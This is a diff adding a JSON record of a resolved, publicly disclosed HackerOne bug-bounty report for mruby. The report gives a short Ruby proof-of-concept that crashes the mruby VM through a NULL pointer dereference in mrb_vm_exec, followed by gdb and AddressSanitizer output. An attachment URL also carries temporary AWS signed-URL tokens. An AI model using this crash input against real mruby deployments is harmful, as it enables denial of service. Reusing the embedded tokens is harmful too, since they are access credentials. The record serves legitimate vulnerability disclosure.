@@ -1,0 +1,190 @@
+{
+  "id": 214845,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTQ4NDU=",
+  "url": "https://hackerone.com/reports/214845",
+  "title": "SIGSEGV in mrb_vm_exec",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2017-03-20T10:27:37.175Z",
+  "submitted_at": "2017-03-20T10:27:37.175Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ston3",
+    "url": "/ston3",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15668,
+    "url": "https://hackerone.com/shopify-scripts",
+    "handle": "shopify-scripts",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "shopify-scripts",
+      "twitter_handle": "",
+      "website": "",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-05-13T21:30:42.349Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2017-04-13T21:30:40.747Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "PoC\n-------------------\n\nThe following code triggers the bug (attached as test_mrb_vm_exec.rb):\n\n\ts=proc{|f,g,x|f[x][g[x]]}.curry\n\tk=proc{|x,y|x}.curry\n\ti=proc{|x|x}.curry\n\tfi0=[]\n\tre0=proc{|x|fi0.size;x}.curry\n\t[s[s[i][i]][k[i]]][0][s[s[k[s]][s[k[s]][s[s[k[s]][s[k[s[k[re0]]]][s[k[s]][k]]]][k]]]][k[s[k[s]][k]]]]\n\nDebug - mirb\n-------------------\n\n\tx@x:~/Desktop/test/mruby/bin$ gdb -q ./mirb\n\tReading symbols from ./mirb...done.\n\t(gdb) r test_mrb_vm_exec.rb \n\tStarting program: /home/x/Desktop/test/mruby/bin/mirb test_mrb_vm_exec.rb\n\tmirb - Embeddable Interactive Ruby Shell\n\n\t => #<Proc:0x6b2290@/home/x/Desktop/test/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30>\n\t => #<Proc:0x6b2080@/home/x/Desktop/test/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30>\n\t => #<Proc:0x6b1e70@/home/x/Desktop/test/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30>\n\t => []\n\t => #<Proc:0x6b1660@/home/x/Desktop/test/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30>\n\n\tProgram received signal SIGSEGV, Segmentation fault.\n\t0x0000000000407731 in mrb_vm_exec (mrb=0x6b0010, proc=0x844e00, pc=0x6af540 <call_iseq>) at /home/x/Desktop/test/mruby/src/vm.c:1361\n\t1361\t          regs[0] = m->env->stack[0];\n\t(gdb) info reg\n\trax            0x3\t3\n\trbx            0x7ffff7fa2400\t140737353753600\n\trcx            0x7ffff7fa23c0\t140737353753536\n\trdx            0xffffffffffffffff\t-1\n\trsi            0x4\t4\n\trdi            0x7ffff7fa23f0\t140737353753584\n\trbp            0x7fffffffc930\t0x7fffffffc930\n\trsp            0x7fffffffc360\t0x7fffffffc360\n\tr8             0x3\t3\n\tr9             0x7ffff7acd7b8\t140737348687800\n\tr10            0x1\t1\n\tr11            0x246\t582\n\tr12            0x401ca0\t4201632\n\tr13            0x7fffffffdf30\t140737488346928\n\tr14            0x0\t0\n\tr15            0x0\t0\n\trip            0x407731\t0x407731 <mrb_vm_exec+8963>\n\teflags         0x10202\t[ IF RF ]\n\tcs             0x33\t51\n\tss             0x2b\t43\n\tds             0x0\t0\n\tes             0x0\t0\n\tfs             0x0\t0\n\tgs             0x0\t0\n\t(gdb) l\n\t1356\t        }\n\t1357\t        else {\n\t1358\t          stack_extend(mrb, irep->nregs, ci->argc+2);\n\t1359\t        }\n\t1360\t        if(m->env) {\n\t1361\t          regs[0] = m->env->stack[0];\n\t1362\t        }\n\t1363\t        pc = irep->iseq;\n\t1364\t        JUMP;\n\t1365\t      }\n\t(gdb) x/x $rax\n\t0x3:\tCannot access memory at address 0x3\n\nBacktrace - mirb\n-------------------\n\n\t(gdb) bt\n\t#0  0x0000000000407731 in mrb_vm_exec (mrb=0x6b0010, proc=0x844e00, pc=0x6af540 <call_iseq>) at /home/x/Desktop/test/mruby/src/vm.c:1361\n\t#1  0x000000000040542c in mrb_vm_run (mrb=0x6b0010, proc=0x6b15a0, self=..., stack_keep=6) at /home/x/Desktop/test/mruby/src/vm.c:823\n\t#2  0x0000000000402b90 in main (argc=2, argv=0x7fffffffdf38) at /home/x/Desktop/test/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549\n\nClang - mirb\n-------------------\n\n\tx@x:~/Desktop/test/mruby/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../clang/mruby/bin/mirb test_mrb_vm_exec.rb \n\tmirb - Embeddable Interactive Ruby Shell\n\n\t => #<Proc:0x62f0000021a0@/home/x/Desktop/test/clang/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30>\n\t => #<Proc:0x62f000001f90@/home/x/Desktop/test/clang/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30>\n\t => #<Proc:0x62f000001d80@/home/x/Desktop/test/clang/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30>\n\t => []\n\t => #<Proc:0x62f000001570@/home/x/Desktop/test/clang/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30>\n\tASAN:DEADLYSIGNAL\n\t=================================================================\n\t==2439==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000003 (pc 0x0000004f7e0d bp 0x7ffff413e660 sp 0x7ffff413d8d0 T0)\n\t\t#0 0x4f7e0c in mrb_vm_exec /home/x/Desktop/test/clang/mruby/src/vm.c:1361:29\n\t\t#1 0x4f5bae in mrb_vm_run /home/x/Desktop/test/clang/mruby/src/vm.c:823:10\n\t\t#2 0x4f3010 in main /home/x/Desktop/test/clang/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549:18\n\t\t#3 0x7f8014effec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287\n\t\t#4 0x41a575 in _start (/home/x/Desktop/test/clang/mruby/bin/mirb+0x41a575)\n\n\tAddressSanitizer can not provide additional info.\n\tSUMMARY: AddressSanitizer: SEGV /home/x/Desktop/test/clang/mruby/src/vm.c:1361:29 in mrb_vm_exec\n\t==2439==ABORTING\n\nDebug - mruby\n-------------------\n\n\tx@x:~/Desktop/test/mruby/bin$ gdb -q ./mruby\n\tReading symbols from ./mruby...done.\n\t(gdb) r test_mrb_vm_exec.rb \n\tStarting program: /home/x/Desktop/test/mruby/bin/mruby test_mrb_vm_exec.rb\n\n\tProgram received signal SIGSEGV, Segmentation fault.\n\t0x000000000044248a in mrb_vm_exec (mrb=0x6af010, proc=0x102f610, pc=0x6ae290 <call_iseq>) at /home/x/Desktop/test/mruby/src/vm.c:1361\n\t1361\t          regs[0] = m->env->stack[0];\n\t(gdb) info reg\n\trax            0x2\t2\n\trbx            0x7ffff7325290\t140737340658320\n\trcx            0x7ffff7325250\t140737340658256\n\trdx            0xffffffffffffffff\t-1\n\trsi            0x4\t4\n\trdi            0x7ffff7325280\t140737340658304\n\trbp            0x7fffffffdb30\t0x7fffffffdb30\n\trsp            0x7fffffffd560\t0x7fffffffd560\n\tr8             0x3\t3\n\tr9             0x46e911\t4647185\n\tr10            0x21021\t135201\n\tr11            0x201\t513\n\tr12            0x401b20\t4201248\n\tr13            0x7fffffffdf30\t140737488346928\n\tr14            0x0\t0\n\tr15            0x0\t0\n\trip            0x44248a\t0x44248a <mrb_vm_exec+8963>\n\teflags         0x10202\t[ IF RF ]\n\tcs             0x33\t51\n\tss             0x2b\t43\n\tds             0x0\t0\n\tes             0x0\t0\n\tfs             0x0\t0\n\tgs             0x0\t0\n\t(gdb) l\n\t1356\t        }\n\t1357\t        else {\n\t1358\t          stack_extend(mrb, irep->nregs, ci->argc+2);\n\t1359\t        }\n\t1360\t        if(m->env) {\n\t1361\t          regs[0] = m->env->stack[0];\n\t1362\t        }\n\t1363\t        pc = irep->iseq;\n\t1364\t        JUMP;\n\t1365\t      }\n\t(gdb) x/x $rax\n\t0x2:\tCannot access memory at address 0x2\n\t\nBacktrace - mruby\n-------------------\n\n\t(gdb) bt\n\t#0  0x000000000044248a in mrb_vm_exec (mrb=0x6af010, proc=0x102f610, pc=0x6ae290 <call_iseq>) at /home/x/Desktop/test/mruby/src/vm.c:1361\n\t#1  0x0000000000440185 in mrb_vm_run (mrb=0x6af010, proc=0x6b13b0, self=..., stack_keep=0) at /home/x/Desktop/test/mruby/src/vm.c:823\n\t#2  0x0000000000448587 in mrb_top_run (mrb=0x6af010, proc=0x6b13b0, self=..., stack_keep=0) at /home/x/Desktop/test/mruby/src/vm.c:2614\n\t#3  0x0000000000438e8d in mrb_load_exec (mrb=0x6af010, p=0x70cf10, c=0x70bb60) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/parse.y:5760\n\t#4  0x0000000000438f23 in mrb_load_file_cxt (mrb=0x6af010, f=0x70cb50, c=0x70bb60) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/parse.y:5769\n\t#5  0x0000000000402415 in main (argc=2, argv=0x7fffffffdf38) at /home/x/Desktop/test/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:227\n\t\nClang - mruby\n-------------------\n\n\tx@x:~/Desktop/test/mruby/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../clang/mruby/bin/mruby test_mrb_vm_exec.rb \n\tASAN:DEADLYSIGNAL\n\t=================================================================\n\t==2413==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000002 (pc 0x00000053d26d bp 0x7fff0300bd40 sp 0x7fff0300afb0 T0)\n\t\t#0 0x53d26c in mrb_vm_exec /home/x/Desktop/test/clang/mruby/src/vm.c:1361:29\n\t\t#1 0x53b00e in mrb_vm_run /home/x/Desktop/test/clang/mruby/src/vm.c:823:10\n\t\t#2 0x543ad3 in mrb_top_run /home/x/Desktop/test/clang/mruby/src/vm.c:2614:12\n\t\t#3 0x52cc90 in mrb_load_exec /home/x/Desktop/test/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5760:7\n\t\t#4 0x52ce62 in mrb_load_file_cxt /home/x/Desktop/test/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5769:10\n\t\t#5 0x4f2b83 in main /home/x/Desktop/test/clang/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:227:11\n\t\t#6 0x7fe2af970ec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287\n\t\t#7 0x41a4e5 in _start (/home/x/Desktop/test/clang/mruby/bin/mruby+0x41a4e5)\n\n\tAddressSanitizer can not provide additional info.\n\tSUMMARY: AddressSanitizer: SEGV /home/x/Desktop/test/clang/mruby/src/vm.c:1361:29 in mrb_vm_exec\n\t==2413==ABORTING",
+  "weakness": {
+    "id": 51,
+    "name": "NULL Pointer Dereference"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 170112,
+      "file_name": "test_mrb_vm_exec.rb",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/170/112/b7b3bc8e7d4b7e29f4fcd62e3bc0de2a15047733/test_mrb_vm_exec.rb?response-content-disposition=attachment%3B%20filename%3D%22test_mrb_vm_exec.rb%22%3B%20filename%2A%3DUTF-8%27%27test_mrb_vm_exec.rb&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5ITRTXJB%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T063522Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDAq%2FqG99wihLKlgCgQYQMQa0KhHVPOco3Tmuyu3afIDgIhAIm%2FjerStMoux21vVLSWQrokkz8dYWF2mFhJqfc6HzRDKrEFCH8QAxoMMDEzNjE5Mjc0ODQ5IgwTPSdKGVdJUBXaUcUqjgWcBCaXLKdNypfcIKUywvO3MFGwQwizhmTWV5m%2FvVaa5hlVD6J9S1ywf3Xn9d%2BXehjMfKRH5LbyBGCLXWu%2B9crOlGX%2F2O7Bx4oF97RA9IViWoDyhgOtZ1p2b%2BGBvSg02QmdpW8%2BvUm9rNtIcxZFh0OitkPgsZrUcat8%2FN%2BVYImuNcKjUnWuQk9loOZM2I8Y8kUjJH5U9gw2mlSenZ3uLGFCHhhExXS05BpI%2BQpsrngBGUPkyk1Zlh67Lr6WkPvT859ZZiMg4bAtN5jd2GlVAhUewocrHbmYx0PlPoAiv2B55cs2kbItIchZJ5Qcpq%2Fc%2Fna6cYSpfj0aFtueRT9I7rhRg1KV6AC8GObDnnQQ0L%2FZRLE012kePYgsEaP2nB5WCHNH2hsc%2FsZfs0TMEZHXmAXfF1c8sTw4Pegi508Yb%2BMqtDmQPa2ZR8jYB5R4xGxMDH9FGrpBFeNRA%2BbOqkvOsxmQxDGkcNWeR9zjTNYwYx5m91DvHfjU1b4lW7ZBo6%2B5GSh917qfUAb%2FO5C0OyQGnn6XUrwjPB3d8x0JEVYhqEb7I6RYUrWjSMaDG3p1HmpBtGO%2FoCd7uWZUl790eTUx5kFdQ6ecYMvtH3wHepm8THevch7glZI7jWVKDXbSC9KZ5WQJ95X%2Fz6r8dk0GQcopDXY9G3s3krOCl1Jxc9xonbEfuu7Ww9%2F%2FZyFp0u4o5UWsFBTtAVELwfsdVWt%2F8h5fBLPAI7d5%2BIwJlaXMiCf8OYDGplD8fWzZcRT0zgBqXvlIQ8PXsxauP9x4K6HdcQM1zxWGWMs9yODFJMGhvtIIXnHJLl3pyKQbeP%2FLU3d0ixRqvkfaH%2FTCyRM%2By40wDvyo8vXnbqf3Fq1eO%2B9KO65RRLcwnNK30gY6sAEgITbtec6ihgU4xST%2Frr8gvjqJyNWjr4izZehOg52FYOLKcWrkdGNTyldZnjKJnXQerR4tlo3ce6FG%2F2SeCkPxqmINt%2BUGgQ6K4js4T8TqyYUAVBZwcbxL44pCgDtNtanYkZqcdYOzMaLucPyqk98Y237jXn5fRAtYz%2FNuW%2BYXEcccYv3tPOoNP5z%2FUuCEJgVpL%2BX%2BLtv%2BcPlOYlh9ZQvc263Q6GZDn8QUEbVEJeM6sw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b1ed02cbe8ec9e2180a319db00d3664779836858d2a03d067ce060d452730c8f",
+      "file_size": 210,
+      "type": "text/plain",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-05-13T21:30:40.779Z",
+  "allow_singular_disclosure_after": -288781481.82282937,
+  "singular_disclosure_allowed": true,
+  "vote_count": 6,
+  "voters": [
+    "apapedulimu",
+    "eveeez",
+    "m7mdharoun",
+    "linkks",
+    "spetr0x",
+    "pkhadka"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "214845",
+  "votes": 6,
+  "latest_disclosable_activity_at": "2017-05-13T21:30:42.376Z",
+  "severity": null,
+  "_metadata": {
+    "saved_at": "2026-07-08T14:35:22.728232",
+    "source": "https://hackerone.com/reports/214845.json",
+    "report_id": 214845
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTQ4NDU=",
+    "databaseId": "214845",
+    "title": "SIGSEGV in mrb_vm_exec",
+    "url": "https://hackerone.com/reports/214845",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2017-05-13T21:30:42.349Z",
+    "created_at": "2017-03-20T10:27:37.175Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzUx",
+      "name": "NULL Pointer Dereference",
+      "external_id": "cwe-476"
+    },
+    "severity": null,
+    "reporter": {
+      "username": "ston3"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzE1NjY4",
+      "handle": "shopify-scripts",
+      "name": "shopify-scripts",
+      "url": "https://hackerone.com/shopify-scripts",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS80NTQ4Mw==",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2017-04-11T22:39:49.469Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzIxNDg0NQ==",
+    "_id": "214845",
+    "disclosed": true,
+    "votes": 6,
+    "latest_disclosable_activity_at": "2017-05-13T21:30:42.376Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTQ4NDU=",
+      "databaseId": "214845",
+      "title": "SIGSEGV in mrb_vm_exec",
+      "url": "https://hackerone.com/reports/214845",
+      "disclosed_at": "2017-05-13T21:30:42.349Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzE1NjY4",
+      "handle": "shopify-scripts",
+      "name": "shopify-scripts",
+      "url": "https://hackerone.com/shopify-scripts",
+      "currency": "usd"
+    }
+  }
+}
